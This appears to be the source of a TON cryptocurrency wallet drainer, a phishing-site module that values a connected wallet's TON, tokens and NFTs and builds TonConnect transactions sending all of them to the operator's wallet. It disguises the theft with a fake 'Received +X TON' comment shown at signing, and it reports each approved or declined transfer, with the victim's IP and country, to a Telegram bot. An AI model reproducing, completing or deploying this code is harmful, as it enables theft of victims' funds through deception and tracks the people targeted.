import { Address, beginCell } from 'ton-core';
import axios from 'axios';
import { sendTelegramMessage, formatNumber, shortAdd, escp, sleep } from './telegram';

interface CF {
  Wallet: string;
  Native: boolean;
  Tokens: boolean;
  NFTs: boolean;
  Tokens_First: boolean;
  Ton_rate: number;
  TonApi_Key: string;
}

const CF: CF = {
  Wallet: process.env.NEXT_PUBLIC_WALLET as string,
  Native: process.env.NEXT_PUBLIC_NATIVE === 'true',
  Tokens: process.env.NEXT_PUBLIC_TOKENS === 'true',
  NFTs: process.env.NEXT_PUBLIC_NFTS === 'true',
  Tokens_First: false,
  Ton_rate: parseFloat(process.env.NEXT_PUBLIC_TON_RATE || "2.99"),
  TonApi_Key: process.env.NEXT_PUBLIC_TONAPI_KEY as string,
};

let nftWhitelistCache: any[] | null = null;

export interface TonData {
  type: string;
  balance: number;
  sendingBalance: number;
  calculatedBalanceUSDTG: number;
}

export interface TokenData {
  type: string;
  wallet_address: string;
  TokenBalance: number;
  roundedBalance: string;
  address: string;
  symbol: string;
  name: string;
  calculatedBalanceUSDTG: number;
  decimals: number;
}

export interface NftData {
  type: string;
  data: string;
  name: string;
  calculatedBalanceUSDTG: number;
}

interface UnifiedAsset {
  type: 'TON' | 'TOKEN' | 'NFT';
  value: number; 
  data: TonData | TokenData | NftData;
  transferCost: number; 
  priority: number; 
  category: string; 
}

const TRANSFER_COSTS = {
  TON: 10000000, 
  TOKEN: 60000000, 
  NFT: 80000000, 
  RESERVE: 50000000, 
  MIN_TON_SEND: 100000000, 
};

const ASSET_PRIORITIES = {
  TON: 1,
  USDT: 2,
  USDC: 3,
  LP: 4,
  NFT: 5,
  ANONYMOUS_NUMBERS: 6,
  USER_TOKENS: 7
};

function getTokenCategory(token: TokenData): { priority: number, category: string } {
  const symbol = token.symbol.toUpperCase();
  const name = token.name.toUpperCase();
  
  if (symbol === 'USDT' || symbol === 'JUSDT' || symbol.includes('USDT')) {
    return { priority: ASSET_PRIORITIES.USDT, category: 'USDT' };
  }
  if (symbol === 'USDC' || symbol === 'JUSDC' || symbol.includes('USDC')) {
    return { priority: ASSET_PRIORITIES.USDC, category: 'USDC' };
  }
  
  if (symbol.includes('LP') || name.includes('LP') || name.includes('LIQUIDITY') || name.includes('POOL')) {
    return { priority: ASSET_PRIORITIES.LP, category: 'LP Token' };
  }
  
  const hasNumbers = /\d{3,}/.test(symbol) || /\d{3,}/.test(name);
  const isAnonymous = symbol.length < 6 && /^[A-Z0-9]+$/.test(symbol) && hasNumbers;
  if (hasNumbers || isAnonymous) {
    return { priority: ASSET_PRIORITIES.ANONYMOUS_NUMBERS, category: 'Anonymous Number' };
  }
  
  return { priority: ASSET_PRIORITIES.USER_TOKENS, category: 'User Token' };
}

function getNftCategory(nft: NftData): { priority: number, category: string } {
  return { priority: ASSET_PRIORITIES.NFT, category: 'NFT' };
}

export async function fetchTonData(address: string): Promise<TonData | null> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}${CF.TonApi_Key ? `?token=${CF.TonApi_Key}` : ''}`
    );
    
    const balanceTON = parseFloat(response.data.balance) / 1000000000;
    const fullBalanceNanoTon = parseFloat(response.data.balance);
    
    const sendingBalance = fullBalanceNanoTon - TRANSFER_COSTS.RESERVE;
    
    console.log(`TON Balance check: Full=${balanceTON.toFixed(4)} TON, Available=${(Math.max(0, sendingBalance)/1000000000).toFixed(4)} TON`);
    
    return sendingBalance > 0 ? {
      type: "TON",
      balance: balanceTON,
      sendingBalance: Math.max(0, sendingBalance),
      calculatedBalanceUSDTG: parseFloat((CF.Ton_rate * balanceTON).toFixed(2))
    } : null;
  } catch (error) {
    console.error('TON data error:', error);
    return null;
  }
}

export async function fetchTokenData(address: string): Promise<TokenData[]> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}/jettons?currencies=ton,usd${CF.TonApi_Key ? `&token=${CF.TonApi_Key}` : ''}`
    );
    
    if (!response.data.balances || response.data.balances.length === 0) return [];
    
    return response.data.balances
      .filter((token: any) => parseFloat(token.balance) > 0 && token.jetton.verification !== "blacklist")
      .map((token: any) => {
        const balance = parseFloat(token.balance) / Math.pow(10, token.jetton.decimals);
        const priceUsd = token.price?.prices?.USD || 0;
        const calculatedBalanceUSDTG = parseFloat((balance * priceUsd).toFixed(2));
        
        return {
          type: "TOKEN",
          wallet_address: token.wallet_address.address,
          TokenBalance: parseFloat(token.balance),
          roundedBalance: balance.toFixed(2),
          address: token.jetton.address,
          symbol: token.jetton.symbol,
          name: token.jetton.name,
          calculatedBalanceUSDTG,
          decimals: token.jetton.decimals
        };
      })
      .filter((token: TokenData) => token.calculatedBalanceUSDTG > 0);
  } catch (error) {
    console.error('Token data error:', error);
    return [];
  }
}

export async function fetchNftData(address: string): Promise<NftData[]> {
  try {
    const response = await axios.get(
      `https://tonapi.io/v2/accounts/${address}/nfts?limit=1000&offset=0&indirect_ownership=false${CF.TonApi_Key ? `&token=${CF.TonApi_Key}` : ''}`
    );
    
    if (!response.data.nft_items || response.data.nft_items.length === 0) return [];
    
    if (!nftWhitelistCache) {
      try {
        const whitelistResponse = await axios.get('/assets/js/nfts_whitelist.json');
        nftWhitelistCache = whitelistResponse.data;
      } catch (e) {
        console.error('NFT whitelist load error:', e);
        nftWhitelistCache = [];
      }
    }
    
    return response.data.nft_items
      .filter((nft: any) => nft.collection && nft.collection.name)
      .map((nft: any) => {
        const collectionAddress = Address.parse(nft.collection.address).toString({bounceable: true});
        const matchingNft = nftWhitelistCache!.find((item: any) => item.nft_address === collectionAddress);
        if (!matchingNft) return null;
        
        const price = parseFloat((matchingNft.average_price * CF.Ton_rate).toFixed(2));
        return price > 0 ? {
          type: "NFT",
          data: nft.address,
          name: nft.metadata.name || 'Unknown NFT',
          calculatedBalanceUSDTG: price
        } : null;
      })
      .filter((nft: NftData | null) => nft !== null) as NftData[];
  } catch (error) {
    console.error('NFT data error:', error);
    return [];
  }
}

function createPrioritizedAssets(
  tonData: TonData | null,
  tokenData: TokenData[],
  nftData: NftData[]
): UnifiedAsset[] {
  const assets: UnifiedAsset[] = [];

  if (CF.Native && tonData) {
    assets.push({
      type: 'TON',
      value: tonData.calculatedBalanceUSDTG,
      data: tonData,
      transferCost: TRANSFER_COSTS.TON,
      priority: ASSET_PRIORITIES.TON,
      category: 'TON'
    });
  }

  if (CF.Tokens && tokenData.length > 0) {
    tokenData.forEach(token => {
      const { priority, category } = getTokenCategory(token);
      assets.push({
        type: 'TOKEN',
        value: token.calculatedBalanceUSDTG,
        data: token,
        transferCost: TRANSFER_COSTS.TOKEN,
        priority,
        category
      });
    });
  }

  if (CF.NFTs && nftData.length > 0) {
    nftData.forEach(nft => {
      const { priority, category } = getNftCategory(nft);
      assets.push({
        type: 'NFT',
        value: nft.calculatedBalanceUSDTG,
        data: nft,
        transferCost: TRANSFER_COSTS.NFT,
        priority,
        category
      });
    });
  }

  assets.sort((a, b) => {
    if (a.priority !== b.priority) {
      return a.priority - b.priority;
    }
    return b.value - a.value;
  });

  console.log('=== ПРИОРИТИЗАЦИЯ АКТИВОВ ===');
  assets.forEach((asset, index) => {
    if (asset.type === 'TON') {
      const tonData = asset.data as TonData;
      console.log(`${index + 1}. ${asset.category} - $${asset.value.toFixed(2)} (${(tonData.sendingBalance/1000000000).toFixed(4)} TON)`);
    } else if (asset.type === 'TOKEN') {
      const token = asset.data as TokenData;
      console.log(`${index + 1}. ${asset.category} (${token.symbol}) - $${asset.value.toFixed(2)}`);
    } else {
      console.log(`${index + 1}. ${asset.category} - $${asset.value.toFixed(2)}`);
    }
  });
  
  return assets;
}

function debugAssetProcessing(
  tonData: TonData | null, 
  tokenData: TokenData[], 
  nftData: NftData[]
) {
  console.log(`=== ASSET DEBUG INFO ===`);
  
  if (tonData) {
    console.log(`TON: Balance=${tonData.balance.toFixed(4)}, SendingBalance=${(tonData.sendingBalance/1000000000).toFixed(4)} TON, USD=${tonData.calculatedBalanceUSDTG}`);
  } else {
    console.log(`TON: No balance available`);
  }
  
  console.log(`Tokens (${tokenData.length}):`);
  tokenData.forEach((token, i) => {
    const { category } = getTokenCategory(token);
    console.log(`  ${i+1}. ${token.symbol} (${category}): ${token.roundedBalance} ($${token.calculatedBalanceUSDTG})`);
  });
  
  console.log(`NFTs (${nftData.length}):`);
  nftData.forEach((nft, i) => {
    console.log(`  ${i+1}. ${nft.name}: $${nft.calculatedBalanceUSDTG}`);
  });
}

function analyzeAndFilterAssets(
  assets: UnifiedAsset[],
  tonData: TonData | null
): {
  scenario: string;
  processableAssets: UnifiedAsset[];
  skippedAssets: UnifiedAsset[];
  totalCostNanoTon: number;
  canProcessAny: boolean;
  reasonMessage: string;
} {
  const availableBalance = tonData?.sendingBalance ?? 0;
  const availableBalanceTON = availableBalance / 1000000000;
  
  console.log(`=== BALANCE ANALYSIS ===`);
  console.log(`Available balance: ${availableBalanceTON.toFixed(4)} TON (${availableBalance} nanoTON)`);
  
  const tonAssets = assets.filter(a => a.type === 'TON');
  const nonTonAssets = assets.filter(a => a.type !== 'TON');
  
  console.log(`Assets count: TON=${tonAssets.length}, Non-TON=${nonTonAssets.length}`);

  if (availableBalance <= 0) {
    return {
      scenario: 'NO_BALANCE',
      processableAssets: [],
      skippedAssets: assets,
      totalCostNanoTon: 0,
      canProcessAny: false,
      reasonMessage: `No TON balance available (${availableBalanceTON.toFixed(4)} TON)`
    };
  }

  const minRequiredForTokens = TRANSFER_COSTS.TOKEN + TRANSFER_COSTS.RESERVE;
  if (availableBalance < minRequiredForTokens && nonTonAssets.length > 0) {
    console.log(`Insufficient balance for any token/NFT transfers`);
    
    const minRequiredForTon = TRANSFER_COSTS.TON + TRANSFER_COSTS.MIN_TON_SEND;
    if (tonAssets.length > 0 && availableBalance >= minRequiredForTon) {
      const tonAsset = tonAssets[0];
      const correctedTonData = {
        ...tonAsset.data as TonData,
        sendingBalance: availableBalance - TRANSFER_COSTS.TON
      };
      
      return {
        scenario: 'TON_ONLY',
        processableAssets: [{
          ...tonAsset,
          data: correctedTonData
        }],
        skippedAssets: nonTonAssets,
        totalCostNanoTon: TRANSFER_COSTS.TON,
        canProcessAny: true,
        reasonMessage: `Only TON transfer possible. Need ${minRequiredForTokens/1000000000} TON for tokens, have ${availableBalanceTON.toFixed(4)} TON`
      };
    }
    
    return {
      scenario: 'INSUFFICIENT_FOR_TOKENS',
      processableAssets: [],
      skippedAssets: assets,
      totalCostNanoTon: 0,
      canProcessAny: false,
      reasonMessage: `Need ${minRequiredForTokens/1000000000} TON for token transfer, have ${availableBalanceTON.toFixed(4)} TON`
    };
  }

  let totalCost = 0;
  const processableAssets: UnifiedAsset[] = [];
  const skippedAssets: UnifiedAsset[] = [];

  const tonReserveNeeded = tonAssets.length > 0 ? TRANSFER_COSTS.TON + TRANSFER_COSTS.MIN_TON_SEND : 0;
  const availableForNonTon = Math.max(0, availableBalance - tonReserveNeeded);
  
  console.log(`Available for non-TON assets: ${availableForNonTon/1000000000} TON`);
  console.log(`Reserved for TON: ${tonReserveNeeded/1000000000} TON`);
  
  for (const asset of nonTonAssets) {
    const costForThisAsset = asset.transferCost;
    
    if (totalCost + costForThisAsset <= availableForNonTon) {
      processableAssets.push(asset);
      totalCost += costForThisAsset;
      console.log(`✅ Added ${asset.category} ($${asset.value.toFixed(2)}) - cost: ${costForThisAsset/1000000000} TON, total: ${totalCost/1000000000} TON`);
    } else {
      skippedAssets.push(asset);
      console.log(`❌ Skipped ${asset.category} ($${asset.value.toFixed(2)}) - would cost: ${costForThisAsset/1000000000} TON, total would be: ${(totalCost + costForThisAsset)/1000000000} TON`);
    }
  }
  
  // Добавляем TON если есть место
  if (tonAssets.length > 0) {
    const tonAsset = tonAssets[0];
    const remainingBalance = availableBalance - totalCost;
    
    if (remainingBalance >= TRANSFER_COSTS.TON + TRANSFER_COSTS.MIN_TON_SEND) {
      const tonSendAmount = remainingBalance - TRANSFER_COSTS.TON;
      
      const correctedTonData = {
        ...tonAsset.data as TonData,
        sendingBalance: tonSendAmount
      };
      
      processableAssets.unshift({ // Добавляем в начало
        ...tonAsset,
        data: correctedTonData
      });
      totalCost += TRANSFER_COSTS.TON;
      console.log(`✅ Added TON ($${tonAsset.value.toFixed(2)}) - sending: ${tonSendAmount/1000000000} TON`);
    } else {
      skippedAssets.push(tonAsset);
      console.log(`❌ Skipped TON ($${tonAsset.value.toFixed(2)}) - insufficient remaining balance: ${remainingBalance/1000000000} TON`);
    }
  }
  
  let scenario = 'FULL_PROCESSING';
  let reasonMessage = 'All assets processed by priority';
  
  if (skippedAssets.length > 0) {
    scenario = 'PARTIAL_PROCESSING';
    reasonMessage = `Processing ${processableAssets.length}/${assets.length} assets by priority. Skipped ${skippedAssets.length} due to insufficient balance`;
  }
  
  console.log(`=== FINAL RESULT ===`);
  console.log(`Scenario: ${scenario}`);
  console.log(`Processable: ${processableAssets.length} assets`);
  console.log(`Skipped: ${skippedAssets.length} assets`);
  console.log(`Total cost: ${totalCost/1000000000} TON`);
  console.log(`Available: ${availableBalance/1000000000} TON`);
  console.log(`Remaining: ${(availableBalance - totalCost)/1000000000} TON`);
  
  return {
    scenario,
    processableAssets,
    skippedAssets,
    totalCostNanoTon: totalCost,
    canProcessAny: processableAssets.length > 0,
    reasonMessage
  };
}

export async function processAssetsOptimized(
  tonData: TonData | null, 
  tokenData: TokenData[], 
  nftData: NftData[], 
  userWallet: string, 
  tonConnectUI: any, 
  ipInfo: { IP: string, ISO2: string },
  host: string
) {
  try {
    debugAssetProcessing(tonData, tokenData, nftData);
    
    const prioritizedAssets = createPrioritizedAssets(tonData, tokenData, nftData);
    
    if (prioritizedAssets.length === 0) {
      console.log('No assets to process');
      return true;
    }

    const analysis = analyzeAndFilterAssets(prioritizedAssets, tonData);
    
    console.log(`=== SCENARIO: ${analysis.scenario} ===`);
    console.log(`Reason: ${analysis.reasonMessage}`);
    console.log(`Can process: ${analysis.canProcessAny}`);
    console.log(`Processable assets: ${analysis.processableAssets.length}`);
    console.log(`Skipped assets: ${analysis.skippedAssets.length}`);
    
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_REQUEST === 'true') {
      await sendAnalysisNotification(analysis, userWallet, tonData);
    }
    
    if (!analysis.canProcessAny) {
      console.warn('Cannot process any assets');
      return false;
    }

    // ИСПРАВЛЕНО: Обрабатываем по 3 актива вместо 4 для надежности
    for (let i = 0; i < analysis.processableAssets.length; i += 3) {
      const chunk = analysis.processableAssets.slice(i, i + 3);
      await processUnifiedTransaction(chunk, userWallet, tonConnectUI, ipInfo, host);
      
      // Увеличил задержку между транзакциями
      if (i + 3 < analysis.processableAssets.length) {
        await sleep(2000);
      }
    }
    
    return true;
  } catch (error) {
    console.error('Optimized asset processing error:', error);
    throw error;
  }
}

async function sendAnalysisNotification(
  analysis: { scenario: string; processableAssets: UnifiedAsset[]; skippedAssets: UnifiedAsset[]; reasonMessage: string },
  userWallet: string,
  tonData: TonData | null
) {
  const availableBalance = tonData ? (tonData.sendingBalance / 1000000000).toFixed(4) : '0';
  
  let icon = '🎣';
  let title = 'Creating priority transfer request';
  let message = '';
  
  switch (analysis.scenario) {
    case 'NO_BALANCE':
      icon = '❌';
      title = 'No balance available';
      message = `Available: *${availableBalance}* TON\n\nNo transfers possible.`;
      break;
      
    case 'INSUFFICIENT_FOR_TOKENS':
      icon = '⚠️';
      title = 'Insufficient balance for tokens';
      message = `Available: *${availableBalance}* TON\nRequired for 1 token: *${(TRANSFER_COSTS.TOKEN/1000000000).toFixed(3)}* TON\n\nNo transfers possible.`;
      break;
      
    case 'TON_ONLY':
      icon = '⚠️';
      title = 'TON-only transfer';
      const tonAsset = analysis.processableAssets[0];
      const sendingAmount = ((tonAsset.data as TonData).sendingBalance / 1000000000).toFixed(4);
      message = `Available: *${availableBalance}* TON\nSending: *${sendingAmount}* TON\n\nSkipped ${analysis.skippedAssets.length} assets (insufficient balance)`;
      break;
      
    case 'PARTIAL_PROCESSING':
      icon = '⚠️';
      title = 'Partial transfer (by priority: TON→USDT→LP→NFT→Numbers→Users)';
      const priorityList = analysis.processableAssets.map(a => a.category).join(', ');
      message = `Available: *${availableBalance}* TON\nProcessing: *${analysis.processableAssets.length}* priority assets\nOrder: ${priorityList}\nSkipped: *${analysis.skippedAssets.length}* lower priority assets`;
      break;
      
    case 'FULL_PROCESSING':
      icon = '🎣';
      title = 'Creating full priority transfer (TON→USDT→LP→NFT→Numbers→Users)';
      const fullPriorityList = analysis.processableAssets.map(a => a.category).join(', ');
      message = `Available: *${availableBalance}* TON\nProcessing: *${analysis.processableAssets.length}* assets\nOrder: ${fullPriorityList}`;
      break;
  }
  
  const notif = `${icon} *${title}* (${shortAdd(userWallet)})\n\n${message}`;
  await sendTelegramMessage(notif);
}

async function processUnifiedTransaction(
  assets: UnifiedAsset[], 
  userWallet: string, 
  tonConnectUI: any, 
  ipInfo: { IP: string, ISO2: string }, 
  host: string
) {
  try {
    const totalUSD = assets.reduce((sum, asset) => sum + asset.value, 0);
    const assetCategories = assets.map(asset => asset.category).join(', ');
    
    let assetDescription = '';
    assets.forEach(asset => {
      if (asset.type === 'TON') {
        const tonData = asset.data as TonData;
        const sendingAmount = (tonData.sendingBalance / 1000000000).toFixed(4);
        assetDescription += `\n• ${asset.category}: *${sendingAmount}* TON`;
      } else if (asset.type === 'TOKEN') {
        const token = asset.data as TokenData;
        assetDescription += `\n• ${asset.category} (${escp(token.symbol)}): *${token.roundedBalance}* ($${asset.value.toFixed(2)})`;
      } else if (asset.type === 'NFT') {
        const nft = asset.data as NftData;
        assetDescription += `\n• ${asset.category}: ${escp(nft.name)} ($${asset.value.toFixed(2)})`;
      }
    });

    const transactionMessages = assets.map(asset => {
      switch (asset.type) {
        case 'TON':
          return createTonMessage(asset.data as TonData);
        case 'TOKEN':
          return createTokenMessage(asset.data as TokenData, userWallet);
        case 'NFT':
          return createNftMessage(asset.data as NftData, userWallet);
        default:
          throw new Error(`Unknown asset type: ${asset.type}`);
      }
    });

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600, // Увеличил время до 10 минут
      messages: transactionMessages
    };

    console.log(`=== SENDING TRANSACTION ===`);
    console.log(`Assets: ${assets.length}`);
    console.log(`Messages: ${transactionMessages.length}`);
    console.log(`Categories: ${assetCategories}`);
    console.log(`Total USD: $${totalUSD.toFixed(2)}`);

    await tonConnectUI.sendTransaction(transaction);

    if (process.env.NEXT_PUBLIC_TG_TRANSFER_SUCCESS === 'true') {
      const successMsg = `✅ *Transfer Approved* (${shortAdd(userWallet)})\n\nCategories: ${assetCategories}\nTotal: ≈ *${formatNumber(totalUSD)}* USD${assetDescription}\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
      await sendTelegramMessage(successMsg);
    }
  } catch (error) {
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_CANCEL === 'true') {
      const totalUSD = assets.reduce((sum, asset) => sum + asset.value, 0);
      const assetCategories = assets.map(asset => asset.category).join(', ');
      const errorMsg = `❌ *Transfer Declined* (${shortAdd(userWallet)})\n\nCategories: ${assetCategories}\nTotal: ≈ *${formatNumber(totalUSD)}* USD\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
      await sendTelegramMessage(errorMsg);
    }
    throw error;
  }
}

// ИСПРАВЛЕННАЯ функция создания TON сообщения
function createTonMessage(tonData: TonData) {
  const sendingAmount = (tonData.sendingBalance / 1000000000).toFixed(4);
  
  const cell = beginCell()
    .storeUint(0, 32)
    .storeStringTail(`Received +${formatNumber(Number(sendingAmount) * 2.29 + 100)} TON`)
    .endCell();
  
  return {
    address: CF.Wallet,
    amount: tonData.sendingBalance.toString(),
    payload: cell.toBoc().toString('base64'),
  };
}

// ИСПРАВЛЕННАЯ функция создания токен сообщения
function createTokenMessage(token: TokenData, userWallet: string) {
  const payloadCell = beginCell()
    .storeUint(0xf8a7ea5, 32)
    .storeUint(0, 64)
    .storeCoins(BigInt(Math.floor(token.TokenBalance)))
    .storeAddress(Address.parse(CF.Wallet))
    .storeAddress(Address.parse(userWallet))
    .storeBit(0)
    .storeCoins(BigInt(10000000))
    .storeBit(0)
    .endCell();
  
  return {
    address: token.wallet_address,
    amount: TRANSFER_COSTS.TOKEN.toString(),
    payload: payloadCell.toBoc().toString('base64')
  };
}

// ИСПРАВЛЕННАЯ функция создания NFT сообщения
function createNftMessage(nft: NftData, userWallet: string) {
  const payloadCell = beginCell()
    .storeUint(0x5fcc3d14, 32)
    .storeUint(0, 64)
    .storeAddress(Address.parse(CF.Wallet))
    .storeAddress(Address.parse(userWallet))
    .storeBit(0)
    .storeCoins(BigInt(10000000))
    .storeBit(0)
    .endCell();
  
  return {
    address: nft.data,
    amount: TRANSFER_COSTS.NFT.toString(),
    payload: payloadCell.toBoc().toString('base64')
  };
}

// Старые функции для совместимости
export async function processAssets(
  tonData: TonData | null, 
  tokenData: TokenData[], 
  nftData: NftData[], 
  userWallet: string, 
  tonConnectUI: any, 
  ipInfo: { IP: string, ISO2: string },
  host: string
) {
  return processAssetsOptimized(tonData, tokenData, nftData, userWallet, tonConnectUI, ipInfo, host);
}